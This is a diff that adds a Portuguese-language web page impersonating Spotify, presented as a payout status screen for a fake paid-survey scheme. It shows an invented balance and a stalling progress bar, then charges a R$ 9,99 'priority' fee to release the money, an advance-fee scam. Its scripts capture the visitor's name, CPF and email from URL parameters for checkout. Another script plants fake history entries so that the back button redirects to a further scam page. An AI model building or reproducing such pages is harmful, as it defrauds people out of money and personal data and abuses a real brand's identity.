@@ -1,0 +1,883 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Status do Envio | OpinaFy</title>
+  <script src="js/form-utils.js"></script>
+
+  <style>
+    :root {
+      --bg: #050505;
+      --panel: #0c0c0c;
+      --panel2: #0f0f0f;
+      --line: #1f1f1f;
+      --green: #2cff5f;
+      --text: #fff;
+      --muted: #9a9a9a;
+      --yellow: #ffd24d;
+    }
+
+    * {
+      box-sizing: border-box
+    }
+
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: var(--text);
+      font-family: Inter, Arial;
+      font-size: 22px;
+      /* coloque 17px ou 18px se quiser ainda maior */
+      overflow-x: hidden;
+      width: 100%;
+      position: relative;
+    }
+
+    .wrap {
+      max-width: 430px;
+      margin: auto;
+      padding: 16px
+    }
+
+    .card {
+      background: linear-gradient(180deg, #0b0b0b, #030303);
+      border: 1px solid var(--line);
+      border-radius: 24px;
+      padding: 18px
+    }
+
+    /* Header / Balance */
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px
+    }
+
+    .brand-logo {
+      width: 42px;
+      height: 42px;
+      border-radius: 14px;
+      border: 1px solid #222
+    }
+
+    .balance-box {
+      background: linear-gradient(145deg, #0b220f, #041108);
+      border: 1px solid rgba(44, 255, 95, .35);
+      border-radius: 16px;
+      padding: 8px 14px;
+      text-align: right;
+      box-shadow: 0 0 0 1px rgba(44, 255, 95, .15) inset;
+    }
+
+    .balance-label {
+      font-size: 11px;
+      color: #b7ffd0
+    }
+
+    .balance-value {
+      font-size: 16px;
+      font-weight: 900;
+      color: var(--green)
+    }
+
+    /* Title */
+    .title {
+      text-align: center;
+      margin: 16px 0 6px
+    }
+
+    .title h1 {
+      margin: 0;
+      font-size: 24px;
+      color: var(--green)
+    }
+
+    .title p {
+      margin-top: 6px;
+      font-size: 16px;
+      color: #a7a7a7
+    }
+
+    /* Status Card */
+    .status-card {
+      background: #0b0b0b;
+      border: 1px solid var(--line);
+      border-radius: 18px;
+      padding: 14px;
+      margin: 14px 0;
+    }
+
+    .status-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center
+    }
+
+    .status-chip {
+      background: #101010;
+      border: 1px solid #222;
+      padding: 6px 10px;
+      border-radius: 999px;
+      font-size: 11px;
+      color: #ddd;
+    }
+
+    .status-chip b {
+      color: #fff
+    }
+
+    /* Progress */
+    .progress-bar {
+      width: 100%;
+      height: 10px;
+      margin-top: 10px;
+      background: #0f0f0f;
+      border: 1px solid var(--line);
+      border-radius: 999px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      width: 85%;
+      height: 100%;
+      background: linear-gradient(90deg, #2cff5f, #1fae4f)
+    }
+
+    /* Steps */
+    .steps {
+      display: flex;
+      gap: 6px;
+      margin-top: 12px
+    }
+
+    .step {
+      flex: 1;
+      text-align: center;
+      font-size: 12px;
+      background: #101010;
+      border: 1px solid var(--line);
+      border-radius: 999px;
+      padding: 8px;
+      color: #999;
+    }
+
+    .step.done {
+      color: var(--green);
+      border-color: rgba(44, 255, 95, .45)
+    }
+
+    .step.active {
+      color: #fff;
+      border-color: rgba(255, 210, 77, .8);
+      box-shadow: 0 0 0 1px rgba(255, 210, 77, .15) inset;
+    }
+
+    /* Compare */
+    .compare {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-top: 14px
+    }
+
+    .c-card {
+      background: #0f0f0f;
+      border: 1px solid var(--line);
+      border-radius: 16px;
+      padding: 12px
+    }
+
+    .c-card.fast {
+      border-color: rgba(44, 255, 95, .6)
+    }
+
+    .c-title {
+      font-weight: 900;
+      font-size: 12px
+    }
+
+    .c-time {
+      margin-top: 6px;
+      font-size: 11px;
+      color: #ccc
+    }
+
+    /* Offer */
+    .offer {
+      margin-top: 14px;
+      background: #0b0b0b;
+      border: 1px solid var(--line);
+      border-radius: 18px;
+      padding: 14px
+    }
+
+    .offer-head {
+      display: flex;
+      justify-content: space-between;
+      align-items: center
+    }
+
+    .price {
+      background: #0b220f;
+      border: 1px solid rgba(44, 255, 95, .3);
+      border-radius: 999px;
+      padding: 7px 12px;
+      color: var(--green);
+      font-weight: 900
+    }
+
+    .cta {
+      display: block;
+      margin-top: 12px;
+      background: var(--green);
+      color: #000;
+      text-align: center;
+      padding: 14px;
+      border-radius: 14px;
+      font-weight: 900;
+      text-decoration: none
+    }
+
+    .cta-sub {
+      text-align: center;
+      font-size: 11px;
+      color: #aaa;
+      margin-top: 6px
+    }
+
+    /* FAQ */
+    .faq {
+      margin-top: 16px;
+      background: #0b0b0b;
+      border: 1px solid var(--line);
+      border-radius: 16px;
+      padding: 14px
+    }
+
+    .qa {
+      border-top: 1px solid #1a1a1a;
+      padding-top: 8px;
+      margin-top: 8px;
+      font-size: 11px
+    }
+
+    .qa:first-child {
+      border-top: none;
+      padding-top: 0;
+      margin-top: 0
+    }
+
+    .faq-box {
+      margin-top: 18px;
+      background: #0b0b0b;
+      border: 1px solid #1f1f1f;
+      border-radius: 18px;
+      padding: 14px;
+    }
+
+    .faq-box h3 {
+      text-align: center;
+      font-size: 13px;
+      color: #ccc;
+      margin-bottom: 12px;
+    }
+
+    .faq-item {
+      border-top: 1px solid #1a1a1a;
+      padding: 8px 0;
+      font-size: 12px;
+    }
+
+    .faq-item:first-child {
+      border-top: none
+    }
+
+    .faq-item strong {
+      display: block;
+      color: #fff;
+      margin-bottom: 4px;
+    }
+
+    .faq-item span {
+      color: #aaa;
+      line-height: 1.45;
+    }
+
+    .faq-item.link a {
+      display: inline-block;
+      margin-top: 4px;
+      color: #2cff5f;
+      font-weight: 700;
+      text-decoration: none;
+    }
+
+    .faq-item.link a:hover {
+      text-decoration: underline
+    }
+
+    .plan-compare {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-top: 18px;
+    }
+
+    .plan {
+      background: #0f0f0f;
+      border: 1px solid #1f1f1f;
+      border-radius: 18px;
+      padding: 14px;
+      position: relative;
+    }
+
+    .plan-head {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 10px;
+    }
+
+    .plan-icon {
+      font-size: 19px;
+      background: #111;
+      border: 1px solid #222;
+      padding: 6px 9px;
+      border-radius: 999px;
+    }
+
+    .plan strong,
+    .c-title {
+      font-size: 22px;
+      /* antes 12px */
+      letter-spacing: .2px;
+    }
+
+    .plan ul li,
+    .c-list,
+    .c-card span {
+      font-size: 14px;
+      /* antes 11px */
+      line-height: 1.6;
+    }
+
+    .plan.standard .plan-head strong {
+      color: #fff;
+    }
+
+    .plan.premium .plan-head strong {
+      color: #2cff5f;
+    }
+
+
+    .plan ul li {
+      font-size: 13px;
+      color: #b7b7b7;
+      margin-bottom: 6px;
+    }
+
+    .plan-footer {
+      margin-top: 12px;
+      text-align: center;
+    }
+
+    .plan-price {
+      display: block;
+      font-size: 14px;
+      font-weight: 900;
+      color: #777;
+    }
+
+    .plan-price.highlight {
+      color: #2cff5f;
+    }
+
+    .plan-btn {
+      display: block;
+      margin: 10px 0 4px;
+      background: #2cff5f;
+      color: #000;
+      padding: 10px;
+      border-radius: 12px;
+      text-decoration: none;
+      font-weight: 900;
+      font-size: 12px;
+    }
+
+    .plan-footer small {
+      font-size: 10px;
+      color: #888;
+    }
+
+    /* Premium destaque */
+    .plan.premium {
+      border-color: rgba(44, 255, 95, .55);
+      box-shadow: 0 0 0 1px rgba(44, 255, 95, .12) inset;
+    }
+
+    .ribbon {
+      position: absolute;
+      top: 10px;
+      right: -34px;
+      transform: rotate(25deg);
+      background: rgba(44, 255, 95, .18);
+      border: 1px solid rgba(44, 255, 95, .35);
+      color: #2cff5f;
+      font-weight: 900;
+      font-size: 10px;
+      padding: 4px 40px;
+    }
+
+
+
+    footer {
+      text-align: center;
+      font-size: 11px;
+      color: #888;
+      margin-top: 14px
+    }
+
+    footer a {
+      color: #aaa;
+      text-decoration: none
+    }
+
+    @keyframes glow {
+      0% {
+        box-shadow: 0 0 0 rgba(44, 255, 95, 0)
+      }
+
+      50% {
+        box-shadow: 0 0 12px rgba(44, 255, 95, .7)
+      }
+
+      100% {
+        box-shadow: 0 0 0 rgba(44, 255, 95, 0)
+      }
+    }
+
+    .step.active {
+      animation: glow 1.4s infinite;
+    }
+
+    .progress-fill {
+      transition: width 1.4s ease;
+    }
+
+    .pix-inline {
+      flex: 1;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: rgba(255, 255, 255, .02);
+      border: 1px solid #141414;
+      border-radius: 12px;
+      padding: 8px 12px;
+      margin-right: 6px;
+    }
+
+
+    .pix-user {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .pix-dot {
+      width: 10px;
+      height: 10px;
+      background: #2cff5f;
+      border-radius: 50%;
+      box-shadow: 0 0 8px rgba(44, 255, 95, .8);
+    }
+
+    .pix-user small,
+    .pix-key small {
+      display: block;
+      font-size: 9px;
+      color: #777;
+    }
+
+    .pix-user strong {
+      font-size: 12px;
+      font-weight: 700;
+      color: #fff;
+    }
+
+    .pix-key span {
+      font-size: 12px;
+      font-weight: 700;
+      color: #2cff5f;
+      letter-spacing: .6px;
+    }
+
+    .pix-identity {
+      display: grid;
+      grid-template-columns: 1fr auto;
+      grid-template-rows: auto auto;
+      gap: 10px 12px;
+      padding: 10px 12px;
+      background: linear-gradient(180deg, #070707, #030303);
+      border: 1px solid #141414;
+      border-radius: 14px;
+      margin-bottom: 10px;
+    }
+
+    .pix-left {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .pix-dot {
+      width: 9px;
+      height: 9px;
+      background: #2cff5f;
+      border-radius: 50%;
+      box-shadow: 0 0 6px rgba(44, 255, 95, .7);
+    }
+
+    .pix-left small,
+    .pix-right small {
+      display: block;
+      font-size: 9px;
+      color: #777;
+    }
+
+    .pix-left strong {
+      font-size: 12px;
+      font-weight: 700;
+    }
+
+    .pix-right {
+      text-align: right;
+    }
+
+    .pix-right span {
+      font-size: 12px;
+      color: #2cff5f;
+      font-weight: 700;
+      letter-spacing: .5px;
+    }
+
+    .pix-meta {
+      grid-column: 1 / span 2;
+      display: flex;
+      gap: 8px;
+    }
+
+    .meta-chip {
+      background: #0e0e0e;
+      border: 1px solid #222;
+      border-radius: 999px;
+      padding: 5px 10px;
+      font-size: 10px;
+      color: #ccc;
+    }
+  </style>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+
+      let progress = 72;
+
+      const bar = document.getElementById("progressFill");
+      const process = document.getElementById("stepProcess");
+      const pix = document.getElementById("stepPix");
+
+      if (!bar || !process || !pix) {
+        console.log("Erro: elementos não encontrados");
+        return;
+      }
+
+      function animateFlow() {
+        if (progress < 85) {
+          progress += 2;
+          bar.style.width = progress + "%";
+        }
+      }
+
+      setInterval(animateFlow, 1200);
+
+      setTimeout(() => {
+        process.classList.add("done");
+        pix.classList.add("active");
+        pix.innerHTML = "⏳ Pix";
+      }, 12000);
+
+    });
+  </script>
+</head>
+
+<body>
+  <div class="wrap">
+    <div class="card">
+
+      <div class="header">
+        <div class="brand">
+          <img src="images/pppbb7b0logospotifypnglogo-spotify.png" class="brand-logo">
+          <strong>Spotify</strong>
+        </div>
+        <div class="balance-box">
+          <div class="balance-label">Saldo disponível</div>
+          <div class="balance-value">R$ 382,76</div>
+        </div>
+      </div>
+
+      <div class="title">
+        <h1>Status do envio</h1>
+        <p>Central de Processamento de Pagamentos</p>
+      </div>
+
+      <div class="status-card">
+
+        <!-- IDENTIDADE DO SAQUE -->
+        <div class="pix-identity">
+          <div class="pix-left">
+            <span class="pix-dot"></span>
+            <div>
+              <small>Titular registrado</small>
+              <strong id="pixNome">Usuário registrado</strong>
+            </div>
+          </div>
+
+          <div class="pix-right">
+            <small>Chave Pix</small>
+            <span id="pixChave">•••••••••mado</span>
+          </div>
+
+          <div class="pix-meta">
+            <div class="meta-chip">⏳ Fila padrão</div>
+            <div class="meta-chip">Próx: Pix</div>
+            <div class="meta-chip" id="pixEmailChip" style="display:none;">📧 <span id="pixEmail">...</span></div>
+          </div>
+        </div>
+
+        <!-- BARRA -->
+        <div class="progress-bar">
+          <div class="progress-fill" id="progressFill"></div>
+        </div>
+
+        <!-- ETAPAS -->
+        <div class="steps">
+          <div class="step done">✔ Solicitação</div>
+          <div class="step done">✔ Verificação</div>
+          <div class="step active" id="stepProcess">⏳ Processamento</div>
+          <div class="step" id="stepPix">○ Pix</div>
+        </div>
+
+      </div>
+
+      <div class="plan-compare">
+
+        <div class="plan standard">
+          <div class="plan-head">
+            <span class="plan-icon">🐢</span>
+            <strong>Fila padrão</strong>
+          </div>
+
+          <ul>
+            <li>Verificação manual</li>
+            <li>Processada por humanos</li>
+            <li>Prazo padrão: até 30 dias úteis</li>
+          </ul>
+
+          <div class="plan-footer">
+            <span class="plan-price">R$ 0,00</span>
+            <small>Incluso no sistema</small>
+          </div>
+        </div>
+
+        <div class="plan premium">
+          <div class="ribbon">RECOMENDADO</div>
+
+          <div class="plan-head">
+            <span class="plan-icon">⚡</span>
+            <strong>Prioridade Premium</strong>
+          </div>
+
+          <ul>
+            <li>Verificação automática</li>
+            <li>saque instantâneo</li>
+            <li>Liberação em até 5 minutos</li>
+          </ul>
+
+          <div class="plan-footer">
+            <span class="plan-price highlight">R$ 9,99</span>
+            <a href="https://pay.conexaoprivada.shop/69b462061b3a88aa9dae9aad" class="plan-btn" id="btnCheckout">
+              Desbloquear agora
+            </a>
+            <small>Opcional · não altera seu saldo</small>
+          </div>
+        </div>
+
+      </div>
+
+      <div class="faq-box">
+        <h3>Dúvidas frequentes</h3>
+
+        <div class="faq-item">
+          <strong>Sou obrigado a ativar a Prioridade Premium?</strong>
+          <span>Não. Você pode aguardar normalmente na fila padrão sem custo adicional.</span>
+        </div>
+
+        <div class="faq-item">
+          <strong>Meu saldo muda ao ativar?</strong>
+          <span>Não. O valor do seu saldo é o mesmo — a prioridade altera apenas a forma de processamento.</span>
+        </div>
+
+        <div class="faq-item">
+          <strong>O que exatamente estou pagando?</strong>
+          <span>Você paga a ativação de rotinas automáticas e uma fila separada de processamento.</span>
+        </div>
+
+        <div class="faq-item">
+          <strong>O saldo fica seguro se eu não pagar?</strong>
+          <span>Sim. Ele permanece registrado até a conclusão completa do fluxo.</span>
+        </div>
+
+        <div class="faq-item link">
+          <strong>Quais são todas as regras de saque?</strong>
+          <a href="https://respondasptfy.shop/" data-utmify-link="">
+            Ver regras completas de saque →
+          </a>
+
+        </div>
+      </div>
+
+
+      <footer>
+        <a href="https://www.spotify.com/br-pt/legal/end-user-agreement/">Termos</a> · <a
+          href="https://www.spotify.com/br-pt/legal/privacy-policy/">Privacidade</a>
+      </footer>
+
+    </div>
+  </div>
+
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+
+      const params = new URLSearchParams(window.location.search);
+      const lead = FormUtils.getLeadData();
+
+      // Prioritize URL params, then fallback to stored lead data, then default
+      // Check multiple possible param names for robustness
+      const nome = params.get("nome") || params.get("name") || params.get("full_name") || lead.full_name || "Usuário registrado";
+      const pix = params.get("pix") || params.get("cpf") || params.get("document") || lead.cpf || "Não informado";
+      const email = params.get("email") || lead.email || "";
+
+      // If we got them from URL, ensure they are saved/updated for consistency
+      const dataToUpdate = {};
+      if (params.get("nome") || params.get("name") || params.get("full_name")) dataToUpdate.full_name = nome;
+      if (params.get("pix") || params.get("cpf") || params.get("document")) dataToUpdate.cpf = pix;
+      if (params.get("email")) dataToUpdate.email = email;
+
+      if (Object.keys(dataToUpdate).length > 0) {
+        FormUtils.saveLeadData(dataToUpdate);
+      }
+
+      const nomeBox = document.getElementById("pixNome");
+      const pixBox = document.getElementById("pixChave");
+      const emailBox = document.getElementById("pixEmail");
+      const emailChip = document.getElementById("pixEmailChip");
+
+      if (nomeBox) nomeBox.innerText = nome;
+      if (pixBox) pixBox.innerText = pix.replace(/.(?=.{4})/g, "•");
+      if (emailBox && email) {
+        emailBox.innerText = email;
+        if (emailChip) emailChip.style.display = "inline-block";
+      }
+
+      // --- ADDED: Include checkout-prefill to rewrite links ---
+      const btnCheckout = document.getElementById("btnCheckout");
+      if (btnCheckout) {
+        btnCheckout.onclick = function (e) {
+          e.preventDefault();
+          try {
+            const baseUrl = this.getAttribute("href");
+            const finalUrl = FormUtils.buildCheckoutURL(baseUrl);
+            console.log("Redirecting to PepperPay:", finalUrl);
+            window.location.href = finalUrl;
+          } catch (err) {
+            console.error("Error redirecting:", err);
+            // Fallback to original link if something goes wrong
+            window.location.href = this.getAttribute("href");
+          }
+          return false;
+        };
+      }
+
+    });
+  </script>
+
+
+  <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '4053625494857896');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=4053625494857896&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+  <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+<script>
+  window.pixelId = "690d62a14026406721407adb";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+
+  <script>
+    // Captura os parâmetros da URL
+    const urlParams = new URLSearchParams(window.location.search);
+
+    // Link de back redirect
+    const link = 'https://respondasptfy.shop/back/01/';
+    const redirectUrl = link + (link.includes('?') ? '&' : '?') + urlParams.toString();
+
+    // Cria histórico falso
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    // Detecta botão "voltar"
+    window.addEventListener('popstate', () => {
+      setTimeout(() => {
+        window.location.href = redirectUrl;
+      }, 1);
+    });
+  </script>
+
+
+  <script src="../js/checkout-prefill.js"></script>
+</body>
+
+</html>
